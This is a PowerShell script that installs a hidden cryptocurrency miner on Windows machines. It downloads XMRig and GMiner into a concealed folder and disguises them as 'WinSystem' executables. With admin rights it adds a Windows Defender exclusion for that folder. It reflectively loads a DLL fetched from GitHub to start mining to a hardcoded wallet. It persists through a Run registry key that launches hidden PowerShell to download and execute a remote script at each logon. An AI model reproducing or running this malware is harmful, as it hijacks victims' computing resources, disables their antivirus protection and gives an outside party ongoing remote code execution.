$GithubUser = "HolyV200"
$RepoName = "btcminer-"
$DllUrl = "https://raw.githubusercontent.com/$GithubUser/$RepoName/main/Bridge.dll?v=$([Guid]::NewGuid().ToString())"
$MinerUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
$GpuMinerUrl = "https://github.com/develsoftware/GMinerRelease/releases/download/3.44/gminer_3_44_windows64.zip"
$Wallet = "bc1qvq0rd2g29g3dpvw9mue0q3c4cvnsuxvwc4tqxr"

$StealthDir = "$env:LOCALAPPDATA\WinSys"

# Connection Settings
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
[Net.ServicePointManager]::CheckCertificateRevocationList = $false # FIX: Bypass network revocation errors

# Robust Fetch Function (Bypasses WebClient restrictions)
function Get-StealthFile($Url, $Path) {
    if (Test-Path $Path) { Remove-Item $Path -Force -ErrorAction SilentlyContinue }
    
    # Try Invoke-WebRequest (Modern PS)
    try {
        Invoke-WebRequest -Uri $Url -OutFile $Path -UseBasicParsing -ErrorAction Stop
        if (Test-Path $Path -and (Get-Item $Path).Length -gt 100) { return $true }
    } catch { }

    # Try curl (Standard Win 10/11 process fallback)
    try {
        if (Get-Command "curl.exe" -ErrorAction SilentlyContinue) {
            curl.exe -L -k --ssl-no-revoke -o $Path $Url # FIX: Added revocation bypass
            if (Test-Path $Path -and (Get-Item $Path).Length -gt 100) { return $true }
        }
    } catch { }

    # Last resort: WebClient (Legacy)
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        $wc.DownloadFile($Url, $Path)
        if (Test-Path $Path -and (Get-Item $Path).Length -gt 100) { return $true }
    } catch { }

    return $false
}

# 1. Prepare Directory & Clear Locks
if (-not (Test-Path $StealthDir)) {
    New-Item -ItemType Directory -Force -Path $StealthDir | Out-Null
} else {
    # FIX: Kill existing miners to release file locks (fixes Access Denied)
    Get-Process | Where-Object { $_.Name -match "WinSystem" -or $_.Path -like "*WinSys*" } | Stop-Process -Force -ErrorAction SilentlyContinue
}

# 2. Silent Exclusion (Admin Only Skip)
try {
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        Add-MpPreference -ExclusionPath $StealthDir -ErrorAction SilentlyContinue
    }
} catch { }

# 3. Setup Paths
$CpuZip = Join-Path $StealthDir "upd_c.zip"
$GpuZip = Join-Path $StealthDir "upd_g.zip"
$CpuExe = Join-Path $StealthDir "WinSystem_x.exe"
$GpuExe = Join-Path $StealthDir "WinSystem_g.exe"

# 4. Download and Extract CPU Miner
if (-not (Test-Path $CpuExe)) {
    if (Get-StealthFile $MinerUrl $CpuZip) {
        # FIX: Integrity check (Ensure ZIP is not an error page)
        if ((Get-Item $CpuZip).Length -gt 100000) {
            try {
                Expand-Archive -Path $CpuZip -DestinationPath $StealthDir -Force
                Remove-Item $CpuZip -Force
                $Unzipped = Get-ChildItem -Path $StealthDir -Filter "xmrig.exe" -Recurse | Select-Object -First 1
                if ($Unzipped) { Move-Item $Unzipped.FullName -Destination $CpuExe -Force }
            } catch { }
        }
    }
}

# 5. GPU Detection and Download
$GpuDetected = $null
try {
    $vc = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue
    if ($vc) {
        $GpuDetected = $vc | Where-Object { $_.Name -match "NVIDIA" -or $_.Name -match "AMD" -or $_.Name -match "Radeon" -or $_.PNPDeviceID -match "VEN_10DE" -or $_.PNPDeviceID -match "VEN_1002" }
    }
} catch { }

if ($GpuDetected -and -not (Test-Path $GpuExe)) {
    if (Get-StealthFile $GpuMinerUrl $GpuZip) {
        # FIX: Integrity check
        if ((Get-Item $GpuZip).Length -gt 100000) {
            try {
                Expand-Archive -Path $GpuZip -DestinationPath $StealthDir -Force
                Remove-Item $GpuZip -Force
                $Unzipped = Get-ChildItem -Path $StealthDir -Filter "miner.exe" -Recurse | Select-Object -First 1
                if ($Unzipped) { Move-Item $Unzipped.FullName -Destination $GpuExe -Force }
            } catch { }
        }
    }
}

# 6. Load Bridge DLL and Start
try {
    $DllPath = Join-Path $StealthDir "Bridge.dll"
    if (Get-StealthFile $DllUrl $DllPath) {
        # Verify DLL isn't corrupted
        if ((Get-Item $DllPath).Length -gt 1000) {
            $dllBytes = [System.IO.File]::ReadAllBytes($DllPath)
            $assembly = [System.Reflection.Assembly]::Load($dllBytes)
            $loader = $assembly.GetType("DateFundLoader")
            $startMethod = $loader.GetMethod("StartMiner")
            
            $GpuArg = if ($GpuDetected) { $GpuExe } else { "" }
            $startMethod.Invoke($null, [object[]]@([string]$CpuExe, [string]$GpuArg, [string]$Wallet))
            
            # HKCU Run Registry key (No Admin needed)
            $RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
            $Name = "WinSys"
            $Value = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"iwr -useb 'https://raw.githubusercontent.com/$GithubUser/$RepoName/main/remote_deploy.ps1' | iex`"" 
            Set-ItemProperty -Path $RegPath -Name $Name -Value $Value
            
            Write-Host "working"
        }
    }
} catch {
}
